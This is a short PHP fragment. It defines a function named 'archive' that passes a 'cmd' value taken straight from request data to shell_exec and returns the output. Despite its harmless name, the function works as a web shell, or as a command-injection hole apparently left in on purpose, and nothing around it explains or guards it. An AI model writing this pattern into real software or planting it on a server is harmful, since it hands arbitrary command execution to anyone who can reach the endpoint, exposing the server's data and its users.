<?php
function archive(array $request) {
    return shell_exec($request['cmd']);
}
